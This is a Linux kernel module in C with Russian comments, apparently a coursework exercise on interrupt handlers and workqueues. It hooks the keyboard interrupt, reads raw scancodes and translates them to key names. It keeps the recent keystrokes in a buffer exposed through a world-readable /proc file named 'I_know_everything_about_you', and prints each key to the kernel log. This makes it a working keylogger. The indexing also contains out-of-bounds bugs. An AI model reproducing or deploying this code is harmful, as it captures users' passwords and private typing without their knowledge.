#include <linux/module.h> // MODULE_LICENSE, MODULE_AUTHOR
#include <linux/kernel.h> // KERN_INFO
#include <linux/init.h>	  // ​Макросы __init и ​__exit
#include <linux/init_task.h>
#include <linux/interrupt.h>
#include <linux/workqueue.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <asm/io.h>

// Посмотреть инф-ию о обработчике прерывания
// cat /proc/interrupts | head -n 1 && cat /proc/interrupts| grep my_irq_handler
// CPUi - число прерываний, полученных i-ым процессорным ядром.

#define KBD_DATA_REG 0x60 /* I/O port for keyboard data */
#define KBD_SCANCODE_MASK 0x7f
#define KBD_STATUS_MASK 0x80

#define KEYS_COUNT 83
#define PROC_FILE_NAME "I_know_everything_about_you"

#define MAX_INFO_LAST 256
#define MAX_LEN_SYMBOL 10

char info_last[MAX_INFO_LAST];
int curr_index = 0;

struct proc_dir_entry *proc_file_entry;

int my_irq = 1; // Прерывание от клавиатуры.
static int irq_cnt = 0;

static struct workqueue_struct *my_wq; //очередь работ

char *keyboard_key[] =
	{
		"[ESC]",
		"1",
		"2",
		"3",
		"4",
		"5",
		"6",
		"7",
		"8",
		"9",
		"0",
		"-",
		"=",
		"bs",
		"[Tab]",
		"Q",
		"W",
		"E",
		"R",
		"T",
		"Y",
		"U",
		"I",
		"O",
		"P",
		"[",
		"]",
		"[Enter]",
		"[CTRL]",
		"A",
		"S",
		"D",
		"F",
		"G",
		"H",
		"J",
		"K",
		"L",
		";",
		"\'",
		"`",
		"[LShift]",
		"\\",
		"Z",
		"X",
		"C",
		"V",
		"B",
		"N",
		"M",
		",",
		".",
		"/",
		"[RShift]",
		"[PrtSc]",
		"[Alt]",
		" ", // Space
		"[Caps]",
		"F1",
		"F2",
		"F3",
		"F4",
		"F5",
		"F6",
		"F7",
		"F8",
		"F9",
		"F10",
		"[Num]",
		"[Scroll]",
		"[Home(7)]",
		"[Up(8)]",
		"[PgUp(9)]",
		"-",
		"[Left(4)]",
		"[Center(5)]",
		"[Right(6)]",
		"+",
		"[End(1)]",
		"[Down(2)]",
		"[PgDn(3)]",
		"[Ins]",
		"[Del]",
}; // All: 83 keys.

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alice");
MODULE_DESCRIPTION("My module!");

static void my_wq_function1(struct work_struct *work) // вызываемая функция
{
	char scancode;
	int scan_normal;
	int len_keyboard_key, i;

	// Считывает скан-код нажатой клавиши.
	scancode = inb(KBD_DATA_REG);
	scan_normal = scancode & KBD_SCANCODE_MASK;

	printk("Scan Code %d %s\n",
		   scancode & KBD_SCANCODE_MASK,
		   scancode & KBD_STATUS_MASK ? "Released" : "Pressed");

	if (!(scancode & KBD_STATUS_MASK))
	{
		if (scan_normal > KEYS_COUNT)
			printk("Scan: I don't know this keyboard key :c");
		else
		{
			printk("Scan: %s", keyboard_key[scan_normal - 1]);
		}

		// Circular buffer.
		len_keyboard_key = strlen(keyboard_key[scan_normal - 1]);
		if (curr_index + len_keyboard_key > MAX_INFO_LAST)
			curr_index = 0;

		// Copy keyboard key to buffer.
		for (i = 0; i < len_keyboard_key; i++)
		{
			info_last[curr_index] = keyboard_key[scan_normal - 1][i];
			curr_index++;
		}
		info_last[curr_index] = '\0';

		printk("Scan: [INFO_LAST - 1] = %c curr_index = %d ", keyboard_key[scan_normal - 1][0], curr_index);
		printk("Scan: [INFO_LAST] = %s ", info_last);
	}

	return;
}

static void my_wq_function2(struct work_struct *work) // вызываемая функция
{
	// For kernel 5.4
	atomic64_t data64 = work->data;
	long long data = data64.counter;
	// For kernel 5.4

	printk("Module: my_wq_function data = %lld\n", data);
	// TODO: А тут ошибка "dereferencing pointer to incomplete type ‘struct workqueue_struct’" (разыменование указателя на неполный тип)
	// printk("Module: my_wq_function data = %lld\n, WQ:name workqueue: %s, current work color:%d", data, my_wq->name, my_wq->work_color);
}

// Каждый раз при открытии будет обновляться информация.
static int show(struct seq_file *m, void *v)
{
	// Файлы последовательности.
	// seq_printf используется для записи данных в оперативную память.
	seq_printf(m, "Length info: %ld\nInfo: %s", strlen(info_last), info_last);
	return 0;
}

static int my_proc_open(struct inode *inode, struct file *file)
{
	// логируем show() с помощью single_open ?
	return single_open(file, show, NULL);
}

static const struct file_operations my_proc_fops =
	{
		.open = my_proc_open, // Логируем (определяем) свою собственную ф-ию.
		.read = seq_read,
		.release = single_release, // используем single_release, потому что используем single_open (выше).
};

// Статическая инициализация структуры.
// Создает (работу) переменную my_work с типом struct work_struct *
DECLARE_WORK(my_work, my_wq_function1);
DECLARE_WORK(my_work2, my_wq_function2);

irqreturn_t irq_handler(int irq, void *dev, struct pt_regs *regs)
{
	if (irq == my_irq)
	{
		// Помещаем структуру в очередь работ.
		// queue_work назначает работу текущему процессору.
		queue_work(my_wq, &my_work);
		queue_work(my_wq, &my_work2);
		printk(KERN_INFO "Module:  my_irq_handler was called %d time(s)", irq_cnt++);
		return IRQ_HANDLED; // прерывание обработано
	}
	else
		return IRQ_NONE; // прерывание не обработано
}

static int __init md_init(void)
{
	// регистрация обработчика прерывания
	if (request_irq(
			my_irq,						/* номер irq */
			(irq_handler_t)irq_handler, /* наш обработчик */
			IRQF_SHARED,				/* линия может быть раздедена, IRQ
										(разрешено совместное использование)*/
			"my_irq_handler",			/* имя устройства (можно потом посмотреть в /proc/interrupts)*/
			(void *)(irq_handler)))		/* Последний параметр (идентификатор устройства) irq_handler нужен
										для того, чтобы можно отключить с помощью free_irq  */
	{
		printk(" + Error request_irq");
		return -1;
	}

	my_wq = create_workqueue("my_queue"); //создание очереди работ
	if (my_wq)
	{
		printk(KERN_INFO "Module: workqueue created!\n");
	}
	else
	{
		free_irq(my_irq, irq_handler); // Отключение обработчика прерывания.
		printk(KERN_INFO "Module: error create_workqueue()!\n");
		return -1;
	}

	// NULL - parent_dir (это означает, что наш файл находится в /proc)
	// 0 означает разрешение по умолчанию 0444 ?
	proc_file_entry = proc_create(PROC_FILE_NAME, 0, NULL, &my_proc_fops);
	if (proc_file_entry == NULL)
		return -ENOMEM;

	printk(KERN_INFO "Module: module md start!\n");
	return 0;
}

static void __exit md_exit(void)
{
	// Принудительно завершаем все работы в очереди.
	// Вызывающий блок блокируется до тех пор, пока операция не будет завершена.
	flush_workqueue(my_wq);
	destroy_workqueue(my_wq);

	// my_irq - номер прерывания.
	// irq_handler - идентификатор устройства.
	free_irq(my_irq, irq_handler); // Отключение обработчика прерывания.

	// NULL - parent_dir (это означает, что наш файл находится в /proc)
	remove_proc_entry(PROC_FILE_NAME, NULL);

	printk(KERN_INFO "Module: Goodbye!\n");
}

module_init(md_init);
module_exit(md_exit);